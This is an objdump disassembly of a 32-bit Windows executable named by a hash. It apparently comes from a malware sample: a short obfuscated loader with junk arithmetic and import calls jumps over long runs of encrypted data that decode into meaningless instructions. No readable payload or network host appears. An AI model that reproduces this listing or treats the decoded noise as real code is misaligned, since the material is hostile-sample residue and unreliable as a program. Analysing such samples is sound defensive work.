
d873d2532f429b3598d5c47a16648a68b1298991277df00bb1601dea1ae7ff73.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0x70
  401006:	add    DWORD PTR ds:0x428237,edx
  40100c:	mov    eax,DWORD PTR [ebp-0x50]
  40100f:	cmp    DWORD PTR ds:0x4282df,0x0
  401016:	mov    DWORD PTR ds:0x4282af,0x2f64
  401020:	not    ecx
  401022:	jmp    0x401482
  401027:	mov    DWORD PTR ds:0x4281ff,0x2f16
  401031:	not    ecx
  401033:	cmp    DWORD PTR ds:0x4282df,0x0
  40103a:	jne    0x401066
  401040:	push   0x2daf
  401045:	call   DWORD PTR ds:0x428d34
  40104b:	mov    ecx,DWORD PTR ds:0x428367
  401051:	sub    DWORD PTR ds:0x42821b,ecx
  401057:	movzx  ecx,WORD PTR ds:0x428247
  40105e:	and    DWORD PTR ds:0x428203,ecx
  401064:	add    ecx,ecx
  401066:	mov    ecx,DWORD PTR ds:0x42818f
  40106c:	xor    edx,edx
  40106e:	add    edx,DWORD PTR ds:0x428287
  401074:	sub    ecx,edx
  401076:	xor    ecx,DWORD PTR [ecx+edx*1]
  401079:	adc    DWORD PTR ds:0x42833f,0x71ea
  401083:	mov    ecx,DWORD PTR ds:0x42826b
  401089:	mov    edx,DWORD PTR ds:0x42836b
  40108f:	sub    edx,ecx
  401091:	xor    ecx,DWORD PTR [ecx+edx*1]
  401094:	adc    DWORD PTR ds:0x4282cf,ebx
  40109a:	and    DWORD PTR ds:0x428217,0x4c59
  4010a4:	jmp    0x401482
  4010a9:	jae    0x4010a7
  4010ab:	ins    DWORD PTR es:[edi],dx
  4010ac:	mov    cl,0x5b
  4010ae:	and    DWORD PTR [ebx],esi
  4010b0:	cmp    ebp,DWORD PTR [edx+0x2ebefcb3]
  4010b6:	sbb    ebp,ebx
  4010b8:	jle    0x4010d2
  4010ba:	sbb    BYTE PTR [eax],bl
  4010bc:	sbb    BYTE PTR [esi+0x27181812],bl
  4010c2:	fisub  WORD PTR [ecx]
  4010c4:	stc    
  4010c5:	ror    BYTE PTR [esi-0x7064e10],0xe6
  4010cc:	cs or  dl,bh
  4010cf:	xor    BYTE PTR [ecx+0x17f9dc10],dh
  4010d5:	jno    0x401135
  4010d7:	sbb    eax,0x648fe8fa
  4010dc:	(bad)  
  4010de:	mov    esp,0xa611f941
  4010e3:	and    eax,0x732a514e
  4010e8:	inc    edx
  4010e9:	mov    ds:0x95d8e3bf,eax
  4010ee:	cld    
  4010ef:	clc    
  4010f0:	sub    eax,0xcd39b412
  4010f5:	dec    eax
  4010f6:	pop    esi
  4010f7:	push   edx
  4010f8:	and    al,0x9
  4010fa:	fcomp  QWORD PTR [ebx-0x3e921a10]
  401100:	dec    esi
  401101:	inc    edx
  401102:	xchg   esp,eax
  401103:	retf   0x94f8
  401106:	xor    BYTE PTR [ebx],0x95
  401109:	jle    0x40110b
  40110b:	sti    
  40110c:	xchg   esi,eax
  40110d:	mov    DWORD PTR [ebx],ecx
  40110f:	arpl   WORD PTR fs:[ebp+esi*4-0x6c5f57e5],sp
  401117:	jmp    0x4010a3
  401119:	adc    DWORD PTR [eax-0x60e1d333],esi
  40111f:	lea    edi,[esi+0x13]
  401122:	gs and al,0xa3
  401125:	es dec esi
  401127:	loope  0x401118
  401129:	into   
  40112a:	sub    al,0x4
  40112c:	fwait
  40112d:	pop    es
  40112e:	add    eax,0xc4c00044
  401133:	add    eax,0x800e62a
  401138:	adc    eax,DWORD PTR [esi]
  40113a:	jnp    0x40114a
  40113c:	xchg   esi,eax
  40113d:	sbb    esp,ebp
  40113f:	sti    
  401140:	jbe    0x4011a2
  401142:	(bad)  
  401143:	adc    DWORD PTR [esi-0x42087a2],esp
  401149:	hlt    
  40114a:	imul   edi,esp,0x6d
  40114d:	stos   BYTE PTR es:[edi],al
  40114e:	dec    ecx
  40114f:	shl    DWORD PTR [ebx+edi*4+0x66],1
  401153:	call   0xc887:0xb65be15d
  40115a:	sbb    edx,ecx
  40115c:	mov    eax,DWORD PTR [edx+0x6449b920]
  401162:	add    ch,BYTE PTR [edi+ebx*8+0x28fa8640]
  401169:	mov    al,ds:0x8a1ef66f
  40116e:	inc    esp
  40116f:	sar    esi,cl
  401171:	gs ds inc ebp
  401174:	push   0xb6c0a067
  401179:	push   ss
  40117a:	(bad)  
  40117b:	xor    edi,DWORD PTR [ecx]
  40117d:	ins    DWORD PTR es:[edi],dx
  40117e:	sub    ch,BYTE PTR [ebx]
  401180:	(bad)  [esi+0x7d]
  401183:	inc    ebp
  401184:	loope  0x401158
  401186:	retf   
  401187:	jge    0x4011fd
  401189:	cmp    eax,0xf2eea07b
  40118e:	out    dx,al
  40118f:	adc    ah,BYTE PTR [edx+0x47]
  401192:	jl     0x4011cc
  401194:	stos   DWORD PTR es:[edi],eax
  401195:	xor    dl,bl
  401197:	pop    esp
  401198:	mov    esp,0x2dd2d474
  40119d:	into   
  40119e:	sub    al,0xd2
  4011a0:	adc    esp,DWORD PTR [ebx]
  4011a2:	call   0x4583:0xf1a56065
  4011a9:	jmp    0xb5845e4c
  4011ae:	ror    DWORD PTR [edx],0xa
  4011b1:	ss mov ecx,0x6791003
  4011b7:	jp     0x40122c
  4011b9:	jge    0x4011cc
  4011bb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4011bc:	pop    es
  4011bd:	pop    ecx
  4011be:	addr16 inc ecx
  4011c0:	or     bl,BYTE PTR [eax+ecx*1-0x17c47407]
  4011c7:	addr16 (bad) 
  4011c9:	mov    esp,0x9f253ce5
  4011ce:	lahf   
  4011cf:	add    ebp,edx
  4011d1:	and    BYTE PTR [ebp+ebp*1+0x25],dh
  4011d5:	jmp    0x401226
  4011d7:	jg     0x401218
  4011d9:	mov    ecx,0x4b2ba188
  4011de:	imul   ecx,DWORD PTR [esi-0x39],0xc1bdf8d6
  4011e5:	cmp    DWORD PTR [esi-0x42bc8296],ebx
  4011eb:	inc    eax
  4011ec:	pop    edx
  4011ed:	jp     0x401268
  4011ef:	je     0x401184
  4011f1:	outs   dx,BYTE PTR ds:[esi]
  4011f2:	mov    edi,0xabb25ff3
  4011f7:	cmp    eax,0x5c7b707b
  4011fc:	jno    0x40122c
  4011fe:	aaa    
  4011ff:	inc    eax
  401200:	iret   
  401201:	loope  0x401244
  401203:	mov    ecx,DWORD PTR [ecx+esi*1+0x3]
  401207:	std    
  401208:	imul   esp,DWORD PTR [esi+ebx*4-0x2277ed2e],0x16
  401210:	push   edx
  401211:	jle    0x40123a
  401213:	jecxz  0x401276
  401215:	ins    BYTE PTR es:[edi],dx
  401216:	mov    bh,0xbc
  401218:	push   0x52
  40121a:	ror    DWORD PTR [edi+eax*4-0x349b774d],cl
  401221:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401222:	inc    ecx
  401223:	mov    bh,0xff
  401225:	pop    ebx
  401226:	mov    edx,0xacf6b16e
  40122b:	mov    dl,cl
  40122d:	mov    ds:0x9ca22f8a,al
  401232:	mov    fs,WORD PTR [ebp-0x2ba2a227]
  401238:	sbb    BYTE PTR [ebp-0x3f1d3f3d],0xd4
  40123f:	jg     0x401273
  401241:	dec    esp
  401242:	rcl    BYTE PTR [edi+0x64f7039],1
  401248:	lods   al,BYTE PTR ds:[esi]
  401249:	call   0x512be853
  40124e:	mov    esp,0xe346b605
  401253:	lock and eax,0x1ce79626
  401259:	inc    eax
  40125a:	call   0x762a:0xe3bad643
  401261:	push   edi
  401262:	mov    dh,0x47
  401264:	cmp    edx,DWORD PTR [esi+0x2d]
  401267:	xor    ebx,ecx
  401269:	jae    0x401252
  40126b:	inc    ebx
  40126c:	add    ebx,ebp
  40126e:	arpl   di,ax
  401270:	fsub   QWORD PTR [edi+0x7a7e4744]
  401276:	cs xor eax,0x438247b5
  40127c:	hlt    
  40127d:	loopne 0x40122c
  40127f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401280:	daa    
  401281:	inc    eax
  401282:	into   
  401283:	jnp    0x401294
  401285:	inc    eax
  401286:	adc    dh,BYTE PTR [eax*2-0x8c91532]
  40128d:	mov    eax,ds:0xcf983975
  401292:	stos   DWORD PTR es:[edi],eax
  401293:	lods   al,BYTE PTR ds:[esi]
  401294:	outs   dx,BYTE PTR ds:[esi]
  401295:	fdivr  QWORD PTR [esi]
  401297:	or     BYTE PTR ds:0x678a434c,0x88
  40129e:	push   esi
  40129f:	jns    0x4012b6
  4012a1:	jmp    0xd40b:0x1dd274e4
  4012a8:	pop    eax
  4012a9:	fs pop edi
  4012ab:	jne    0x4012d1
  4012ad:	dec    edx
  4012ae:	adc    DWORD PTR [ebp-0xd58b322],ebp
  4012b4:	sbb    eax,DWORD PTR [ecx-0x4c]
  4012b7:	mov    fs,WORD PTR [ebx-0x1c07c5df]
  4012bd:	pushf  
  4012be:	mov    al,0x92
  4012c0:	inc    eax
  4012c1:	sub    DWORD PTR [ebp-0x2f],ecx
  4012c4:	pop    ss
  4012c5:	xlat   BYTE PTR ds:[ebx]
  4012c6:	ins    BYTE PTR es:[edi],dx
  4012c7:	pop    edi
  4012c8:	xchg   esp,eax
  4012c9:	pop    edx
  4012ca:	sahf   
  4012cb:	sbb    al,0x30
  4012cd:	pop    edi
  4012ce:	sti    
  4012cf:	mov    BYTE PTR ds:0xc1c6a207,ch
  4012d5:	adc    eax,0x7b2f47da
  4012da:	dec    ecx
  4012db:	xchg   edx,eax
  4012dc:	inc    cx
  4012de:	jno    0x4012bb
  4012e0:	retf   0x5007
  4012e3:	ins    DWORD PTR es:[edi],dx
  4012e4:	push   eax
  4012e5:	lea    ecx,[edi]
  4012e7:	pop    edx
  4012e8:	fistp  DWORD PTR [edi-0x33112c46]
  4012ee:	or     eax,0x1171aa8f
  4012f3:	xor    edi,DWORD PTR [esi-0x7a]
  4012f6:	push   es
  4012f7:	xchg   ebx,eax
  4012f8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4012f9:	xlat   BYTE PTR ds:[ebx]
  4012fa:	pop    ecx
  4012fb:	and    dl,BYTE PTR [esi]
  4012fd:	add    DWORD PTR [ecx+0x410184ea],ebx
  401303:	pop    ds
  401304:	cmc    
  401305:	adc    edi,DWORD PTR [eax-0x2fd69b7a]
  40130b:	fld    QWORD PTR [esi+0x1f]
  40130e:	mov    WORD PTR [ebp-0x4d0fdd97],es
  401314:	mov    eax,0x8ce9ed0
  401319:	fldcw  WORD PTR [ecx-0x7a]
  40131c:	fisub  WORD PTR [ecx-0x41]
  40131f:	les    edi,FWORD PTR [ebp-0x30b22fde]
  401325:	mov    edx,0x107755d6
  40132a:	daa    
  40132b:	pop    esp
  40132c:	clc    
  40132d:	data16 and BYTE PTR [ebp-0x7a4d49],ch
  401334:	fs mov dh,0x22
  401337:	sbb    al,0xff
  401339:	stos   BYTE PTR es:[edi],al
  40133a:	mov    eax,0xe2426604
  40133f:	mov    edi,0x297a2315
  401344:	push   ebx
  401345:	pop    es
  401346:	lds    esi,FWORD PTR [edi+0x6440cbe]
  40134c:	sbb    BYTE PTR [ebx-0xb0ee1b0],0x59
  401353:	dec    edi
  401354:	or     ah,BYTE PTR [eax+0x23]
  401357:	gs scas al,BYTE PTR es:[edi]
  401359:	(bad)  
  40135a:	jecxz  0x401366
  40135c:	das    
  40135d:	xchg   ebx,eax
  40135e:	test   DWORD PTR [edx-0x363f2bb0],edx
  401364:	jb     0x401304
  401366:	or     dl,ah
  401368:	pushf  
  401369:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40136a:	cmp    eax,0x557d5153
  40136f:	aad    0x74
  401371:	mov    esi,0xf090cb4f
  401376:	or     eax,0xb74b680c
  40137b:	cmp    esi,DWORD PTR [ebp+0x23]
  40137e:	test   DWORD PTR [ecx+0x79],edi
  401381:	or     BYTE PTR [ebx+0x4a],cl
  401384:	or     BYTE PTR [edi],ch
  401386:	mov    eax,0x34ae4254
  40138b:	inc    esi
  40138c:	jb     0x401407
  40138e:	fcomp  QWORD PTR [ebx]
  401390:	gs inc edi
  401392:	xor    al,0xba
  401394:	(bad)  
  401395:	sbb    al,0x8d
  401397:	push   ss
  401398:	shl    BYTE PTR [edi+0x60],cl
  40139b:	sbb    al,0x67
  40139d:	mov    ch,0x44
  40139f:	mov    ah,0x97
  4013a1:	xor    DWORD PTR [edx+0x12043dfd],0x2e
  4013a8:	mov    edi,?
  4013aa:	imul   ebx,DWORD PTR [edx-0x1b],0x121fd230
  4013b1:	mov    DWORD PTR [ebx],eax
  4013b3:	cmp    DWORD PTR [edi+ebx*2-0x2976a8a],edx
  4013ba:	jae    0x4013f2
  4013bc:	sbb    cl,BYTE PTR [ebx+0x6c380975]
  4013c2:	ds pop ds
  4013c4:	mov    al,ds:0x3f9604b4
  4013c9:	mov    cl,0x1f
  4013cb:	mov    esi,0xf045db2d
  4013d0:	or     al,al
  4013d2:	mov    ds:0xfd2b87d9,al
  4013d7:	push   0x3df9e0bc
  4013dc:	dec    esp
  4013dd:	pop    ebx
  4013de:	(bad)  
  4013e0:	cmp    BYTE PTR [ebp-0x4fd413c5],al
  4013e6:	lods   al,BYTE PTR ds:[esi]
  4013e7:	push   esp
  4013e8:	int    0xce
  4013ea:	test   al,0x4d
  4013ec:	repnz enter 0xb0c1,0x6c
  4013f1:	pusha  
  4013f2:	cwde   
  4013f3:	cmp    eax,0xa1a1484c
  4013f8:	mov    ecx,0xc80eae30
  4013fd:	retf   
  4013fe:	pusha  
  4013ff:	dec    eax
  401400:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401401:	mov    cl,0x4b
  401403:	ficom  DWORD PTR [edx]
  401405:	scas   eax,DWORD PTR es:[edi]
  401406:	or     BYTE PTR [ebx+edi*2-0x75c25322],0x69
  40140e:	mov    bh,0xd6
  401410:	pusha  
  401411:	adc    al,0x2e
  401413:	fcomp  DWORD PTR [edi]
  401415:	xor    ebx,DWORD PTR [edx-0x384b6099]
  40141b:	shl    BYTE PTR [ebx+0x16],cl
  40141e:	mov    esi,0x11465767
  401423:	lock lods al,BYTE PTR ds:[esi]
  401425:	push   0x73
  401427:	retf   0xa46d
  40142a:	stos   DWORD PTR es:[edi],eax
  40142b:	iret   
  40142c:	jnp    0x4013f7
  40142e:	(bad)  
  40142f:	outs   dx,BYTE PTR ds:[esi]
  401430:	sub    BYTE PTR [ebx],al
  401432:	ud0    edx,DWORD PTR [ecx+ebp*1-0x11]
  401437:	and    bl,al
  401439:	and    al,0x76
  40143b:	mov    ebp,0x8c84fa2f
  401440:	add    eax,0x827f5000
  401445:	fadd   DWORD PTR [edi]
  401447:	or     dh,BYTE PTR [edx]
  401449:	add    cl,bl
  40144b:	adc    ebp,DWORD PTR [edi+esi*4-0x67]
  40144f:	scas   eax,DWORD PTR es:[edi]
  401450:	lods   eax,DWORD PTR ds:[esi]
  401451:	ss inc edx
  401453:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401454:	in     eax,dx
  401455:	in     al,dx
  401456:	repnz xor bh,dl
  401459:	stos   BYTE PTR es:[edi],al
  40145a:	jl     0x401427
  40145c:	loope  0x401406
  40145e:	test   BYTE PTR [edx-0xf],0x4d
  401462:	(bad)  
  401463:	xor    eax,0xc8eb4c27
  401468:	imul   esp,DWORD PTR [edi+0x1ad09a04],0xffffffa4
  40146f:	gs xor bl,dl
  401472:	or     eax,DWORD PTR [eax+0x48576c89]
  401478:	and    dh,BYTE PTR [edx+edi*4-0x7d]
  40147c:	sub    BYTE PTR [ecx+0x344100c],ah
  401482:	mov    ecx,DWORD PTR [ebp-0x4c]
  401485:	mov    edx,DWORD PTR [ebp-0x50]
  401488:	sub    eax,edx
  40148a:	mov    DWORD PTR ds:0x42832f,edx
  401490:	push   edi
  401491:	mov    edi,DWORD PTR [ebp-0x4c]
  401494:	mov    DWORD PTR [ebp-0x50],eax
  401497:	mov    edx,0x488c
  40149c:	sbb    ecx,edi
  40149e:	mov    DWORD PTR [ebp-0x4c],ecx
  4014a1:	mov    edx,DWORD PTR ds:0x42826b
  4014a7:	mov    edx,DWORD PTR [edx]
  4014a9:	and    DWORD PTR ds:0x4282bb,edx
  4014af:	or     DWORD PTR [ebp-0x50],0xca78cc41
  4014b6:	or     DWORD PTR [ebp-0x4c],0x9c1b89e8
  4014bd:	and    DWORD PTR ds:0x4281eb,0x6649
  4014c7:	mov    eax,DWORD PTR [ebp-0x58]
  4014ca:	add    ecx,0xa44
  4014d0:	mov    ecx,DWORD PTR [ebp-0x54]
  4014d3:	cmp    DWORD PTR ds:0x428213,0x0
  4014da:	mov    DWORD PTR ds:0x4281ef,ecx
  4014e0:	mov    DWORD PTR ds:0x4282b3,0x3ae4
  4014ea:	mov    edi,0x1ebc
  4014ef:	mov    edx,0x7e4f
  4014f4:	jmp    0x40154f
  4014f9:	not    DWORD PTR ds:0x42812b
  4014ff:	mov    edx,0x300f
  401504:	cmp    DWORD PTR ds:0x428213,0x0
  40150b:	jae    0x401543
  401511:	push   0x1b93
  401516:	call   DWORD PTR ds:0x428d38
  40151c:	mov    edx,DWORD PTR ds:0x42828b
  401522:	xor    edi,edi
  401524:	or     edi,DWORD PTR ds:0x428303
  40152a:	sub    edx,edi
  40152c:	or     edx,DWORD PTR [edx+edi*1]
  40152f:	xor    edx,edx
  401531:	add    edx,DWORD PTR ds:0x42815f
  401537:	mov    edi,DWORD PTR ds:0x428307
  40153d:	sub    edi,edx
  40153f:	imul   edx,DWORD PTR [edx+edi*1]
  401543:	and    edi,0x359a
  401549:	or     edi,0x3261
  40154f:	mov    edx,DWORD PTR [ebp-0x58]
  401552:	mov    edi,DWORD PTR [ebp-0x54]
  401555:	jmp    0x401933
  40155a:	outs   dx,DWORD PTR ds:[esi]
  40155b:	add    eax,0x3a5a4a0b
  401560:	das    
  401561:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401562:	out    dx,al
  401563:	sbb    ebx,DWORD PTR [ebp+0x77c7c770]
  401569:	jl     0x401509
  40156b:	adc    bl,BYTE PTR [eax]
  40156d:	sbb    BYTE PTR [esi+0x6181812],bl
  401573:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401574:	xchg   ebp,eax
  401575:	faddp  st(4),st
  401577:	mov    ah,0x25
  401579:	sahf   
  40157a:	ins    BYTE PTR es:[edi],dx
  40157b:	sbb    ecx,ebx
  40157d:	inc    eax
  40157e:	and    eax,0x3cd1fc32
  401583:	aad    0xa1
  401585:	idiv   DWORD PTR [ebx-0x71f27632]
  40158b:	loopne 0x401551
  40158d:	aas    
  40158e:	mov    ch,0xcd
  401590:	retf   
  401591:	push   cs
  401592:	sbb    eax,0x98281ab3
  401597:	or     al,0x4c
  401599:	test   al,0x51
  40159b:	add    DWORD PTR [edi],edx
  40159d:	rol    cl,1
  40159f:	addr16 add eax,0x96ddb255
  4015a5:	sbb    ah,BYTE PTR [edx+0x730a2635]
  4015ab:	retf   
  4015ac:	cmc    
  4015ad:	jp     0x4015ca
  4015af:	ins    BYTE PTR es:[edi],dx
  4015b0:	mov    BYTE PTR [edi],dh
  4015b2:	push   edi
  4015b3:	xlat   BYTE PTR ds:[ebx]
  4015b4:	fcom   DWORD PTR [edi]
  4015b6:	repnz pushf 
  4015b8:	xchg   edx,eax
  4015b9:	dec    esi
  4015ba:	ds call 0x255417ed
  4015c0:	imul   edx,DWORD PTR ds:[ebx-0x5ec468c3],0xc
  4015c8:	inc    edi
  4015c9:	add    dl,BYTE PTR [edx-0x7c1439b6]
  4015cf:	jecxz  0x4015a7
  4015d1:	imul   ebx,DWORD PTR [edi],0x6f6a3f8b
  4015d7:	mov    ah,BYTE PTR [ecx]
  4015d9:	add    ah,BYTE PTR [ecx+eiz*2-0x11]
  4015dd:	mul    cl
  4015df:	xlat   BYTE PTR ds:[ebx]
  4015e0:	(bad)  
  4015e1:	addr16 pop ebx
  4015e3:	push   ss
  4015e4:	(bad)  
  4015e5:	test   BYTE PTR [ecx+eiz*4+0x6b],bl
  4015e9:	sub    DWORD PTR [ebp+0x0],edx
  4015ec:	test   esp,0xc99e9c36
  4015f2:	adc    al,0xdb
  4015f4:	mov    BYTE PTR [esi-0x137756ab],bl
  4015fa:	xor    al,0xf9
  4015fc:	js     0x4015a7
  4015fe:	xor    BYTE PTR [eax+0x21],0x95
  401602:	xor    eax,0xb8c5d275
  401607:	inc    ebp
  401608:	icebp  
  401609:	add    al,bh
  40160b:	xchg   edx,eax
  40160c:	je     0x401684
  40160e:	js     0x401615
  401610:	sbb    BYTE PTR [ebp+0x24],0x9b
  401614:	es (bad) 
  401616:	dec    ecx
  401617:	dec    edi
  401618:	pop    es
  401619:	clc    
  40161a:	mov    edi,0xb72ab0c4
  40161f:	adc    dh,bl
  401621:	inc    ebx
  401622:	repz (bad) 
  401624:	jg     0x4015eb
  401626:	jmp    0xd5dce3aa
  40162b:	jle    0x4015ad
  40162d:	sbb    esp,DWORD PTR [esi]
  40162f:	shl    DWORD PTR [esi],1
  401631:	(bad)  
  401632:	xchg   ebp,eax
  401633:	dec    eax
  401634:	fldcw  WORD PTR [ecx]
  401636:	push   ds
  401637:	and    dh,bh
  401639:	jecxz  0x4015f2
  40163b:	adc    ch,ch
  40163d:	pusha  
  40163e:	xlat   BYTE PTR ds:[ebx]
  40163f:	push   0x5b
  401641:	add    cl,BYTE PTR [ecx]
  401643:	ret    0x6550
  401646:	rol    DWORD PTR [ebx-0x6b5e9b5c],cl
  40164c:	(bad)
  40164f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401650:	popf   
  401651:	mov    edi,eax
  401653:	inc    esp
  401654:	add    eax,0x3ec33954
  401659:	dec    ebx
  40165a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40165b:	adc    BYTE PTR [esi+0x46],0x15
  40165f:	call   0x4554392e
  401664:	sbb    eax,0x8881a6b3
  401669:	dec    ebp
  40166a:	and    cl,BYTE PTR [edi]
  40166c:	mov    ecx,0x4462c320
  401671:	sbb    eax,0x812e7e3c
  401676:	in     al,0x4
  401678:	int3   
  401679:	dec    edi
  40167a:	clc    
  40167b:	cmp    BYTE PTR [ebp-0x46],cl
  40167e:	pop    edi
  40167f:	or     cl,cl
  401681:	scas   eax,DWORD PTR es:[edi]
  401682:	jb     0x40166a
  401684:	inc    esp
  401685:	ret    0xc15
  401688:	adc    BYTE PTR [ebp+0x2d],cl
  40168b:	xchg   esp,eax
  40168c:	inc    esi
  40168d:	ret    
  40168e:	aas    
  40168f:	add    esp,DWORD PTR [ebx-0x2e78c155]
  401695:	enter  0xe551,0x80
  401699:	loop   0x4016c9
  40169b:	cdq    
  40169c:	mov    bh,0x3b
  40169e:	les    ebx,FWORD PTR [edx+ecx*8]
  4016a1:	outs   dx,BYTE PTR ds:[esi]
  4016a2:	mov    bh,0x34
  4016a4:	adc    al,0x33
  4016a6:	fnstenv [ecx-0x3bee1ee4]
  4016ac:	cmp    al,0x12
  4016ae:	mov    eax,ds:0x1379ca8f
  4016b3:	in     al,0x48
  4016b5:	mov    bh,bl
  4016b7:	pop    DWORD PTR [eax+0x576ebeef]
  4016bd:	push   cs
  4016be:	out    0x12,eax
  4016c0:	fidivr DWORD PTR ds:[esi+ebx*4]
  4016c4:	das    
  4016c5:	adc    BYTE PTR [esi+esi*2],0x70
  4016c9:	cs cdq 
  4016cb:	pop    edx
  4016cc:	(bad)  [ebx]
  4016ce:	adc    DWORD PTR [edi],edi
  4016d0:	ret    
  4016d1:	dec    esp
  4016d2:	mov    eax,ds:0x6f9bb5d
  4016d7:	imul   eax,DWORD PTR [esi+eiz*1-0x2c],0x5ef8cede
  4016df:	push   cs
  4016e0:	sub    bh,cl
  4016e2:	xchg   edi,eax
  4016e4:	add    ch,BYTE PTR [edi]
  4016e6:	push   ss
  4016e7:	jp     0x4016b7
  4016e9:	dec    esi
  4016ea:	pop    eax
  4016eb:	lahf   
  4016ec:	and    ebp,ecx
  4016ee:	retf   0xc805
  4016f1:	and    al,0x89
  4016f3:	mul    DWORD PTR [ecx]
  4016f5:	xlat   BYTE PTR ds:[ebx]
  4016f6:	jno    0x4016ee
  4016f8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4016f9:	pop    eax
  4016fa:	out    0x66,eax
  4016fc:	scas   eax,DWORD PTR es:[edi]
  4016fd:	jg     0x401683
  4016ff:	xor    esp,DWORD PTR [ebp-0x1a]
  401702:	cli    
  401703:	cli    
  401704:	(bad)  
  401705:	pop    edx
  401706:	jo     0x4016ab
  401708:	(bad)  
  401709:	hlt    
  40170a:	out    0xf6,eax
  40170c:	dec    eax
  40170d:	stos   DWORD PTR es:[edi],eax
  40170e:	sbb    eax,DWORD PTR [esi-0xe]
  401711:	sub    bl,BYTE PTR [esi+0x58]
  401714:	jmp    0x505e:0xf6245c76
  40171b:	mov    ebx,0x723c91a4
  401720:	in     eax,dx
  401721:	out    dx,al
  401722:	mov    bl,0x62
  401724:	inc    ebp
  401725:	add    BYTE PTR ds:0x21dc3608,bl
  40172b:	xor    BYTE PTR [ebx-0x7c356250],0xc
  401732:	add    bl,BYTE PTR [edi-0x13036ee2]
  401738:	and    ah,BYTE PTR [ebx-0x68]
  40173b:	and    esp,DWORD PTR [esi-0x129ba321]
  401741:	loopne 0x40178f
  401743:	in     eax,dx
  401744:	inc    edx
  401745:	stos   BYTE PTR es:[edi],al
  401746:	pop    esp
  401747:	push   ds
  401748:	adc    DWORD PTR [edx],ecx
  40174a:	stos   DWORD PTR es:[edi],eax
  40174b:	ins    DWORD PTR es:[edi],dx
  40174c:	add    ch,bh
  40174e:	fisubr DWORD PTR [ebx-0x61fda94e]
  401754:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401755:	jmp    0x5078:0xa279e80c
  40175c:	dec    ecx
  40175d:	push   ecx
  40175e:	sar    al,1
  401760:	push   esp
  401761:	stos   DWORD PTR es:[edi],eax
  401762:	pop    ebp
  401763:	(bad)  
  401764:	jnp    0x4016ea
  401766:	cmc    
  401767:	outs   dx,BYTE PTR ds:[esi]
  401768:	test   DWORD PTR gs:[ebp-0x75],edx
  40176c:	cs int 0xb8
  40176f:	push   ebp
  401770:	push   0xffffff84
  401772:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401773:	cdq    
  401774:	loopne 0x4016fa
  401776:	sahf   
  401777:	or     dl,BYTE PTR [edi+ebx*2+0x5d]
  40177b:	sub    BYTE PTR [ebx+ebx*2+0x5be60a57],bh
  401782:	push   edi
  401783:	add    bh,dl
  401785:	call   0x839d512c
  40178a:	(bad)  
  40178b:	fwait
  40178c:	sar    BYTE PTR [edx+eax*4+0x28b025a1],cl
  401793:	mov    eax,0x6ebb87f8
  401798:	xlat   BYTE PTR ds:[ebx]
  401799:	neg    DWORD PTR [esp+esi*1+0x1b]
  40179d:	pop    bp
  40179f:	mov    eax,ds:0x512f695a
  4017a4:	jmp    0x6fe5:0xa204d576
  4017ab:	xchg   DWORD PTR [esi+0x388f4a35],eax
  4017b1:	adc    al,0xfd
  4017b3:	adc    al,0x1b
  4017b5:	mov    esp,0xdf637804
  4017ba:	cdq    
  4017bb:	popa   
  4017bc:	repz mov eax,0x9ecd5afc
  4017c2:	repz out dx,eax
  4017c4:	pop    ebx
  4017c5:	pop    es
  4017c6:	dec    ecx
  4017c7:	outs   dx,BYTE PTR ds:[esi]
  4017c8:	aad    0x2c
  4017ca:	stc    
  4017cb:	adc    eax,0x27b99a0d
  4017d0:	fcom   DWORD PTR [eax-0xb]
  4017d3:	ret    0xaf76
  4017d6:	jbe    0x4017d8
  4017d8:	daa    
  4017d9:	imul   edi,DWORD PTR [eax],0x1f
  4017dc:	push   cs
  4017dd:	in     eax,0x13
  4017df:	daa    
  4017e0:	cmp    DWORD PTR [ebx+0xd3214dc],ecx
  4017e6:	lock or bl,BYTE PTR [edx]
  4017e9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4017ea:	sub    ebp,DWORD PTR [eax-0x6b]
  4017ed:	cmp    al,BYTE PTR [eax]
  4017ef:	sbb    al,0x99
  4017f1:	cld    
  4017f2:	lods   al,BYTE PTR ds:[esi]
  4017f3:	jl     0x401811
  4017f5:	jns    0x4017f9
  4017f7:	outs   dx,BYTE PTR ds:[esi]
  4017f8:	pop    edi
  4017f9:	test   DWORD PTR [ebp-0x41],0x49c1c18b
  401800:	loope  0x40185a
  401802:	cmp    cl,BYTE PTR [esi]
  401804:	enter  0x2471,0xac
  401808:	scas   eax,DWORD PTR es:[edi]
  401809:	sub    esi,DWORD PTR [edi+0x78c8bb3f]
  40180f:	data16 fst DWORD PTR [ecx+0x4138af7f]
  401816:	cdq    
  401817:	xchg   edi,eax
  401818:	jge    0x4017b6
  40181a:	(bad)  
  40181b:	je     0x40179f
  40181d:	xor    esi,DWORD PTR [edx+0xf]
  401820:	fdiv   QWORD PTR [ecx]
  401822:	cmp    al,0xdd
  401824:	sub    al,0x3a
  401826:	or     al,0x73
  401828:	pop    ebp
  401829:	add    al,0xeb
  40182b:	xor    al,0x9d
  40182d:	pop    ebp
  40182e:	mov    ds:0x3aa03bb3,al
  401833:	ds out dx,eax
  401835:	es push edx
  401837:	outs   dx,BYTE PTR ds:[esi]
  401838:	mov    cl,0x80
  40183a:	jo     0x401890
  40183c:	push   eax
  40183d:	sbb    DWORD PTR fs:[ecx],0xe
  401841:	in     al,dx
  401842:	pop    esi
  401843:	fidiv  DWORD PTR [ecx+0x1fbd5fc1]
  401849:	bnd jl 0x401851
  40184c:	xchg   ebp,eax
  40184d:	add    ah,BYTE PTR [eax-0x130c5853]
  401853:	icebp  
  401854:	jmp    0x40183e
  401856:	cld    
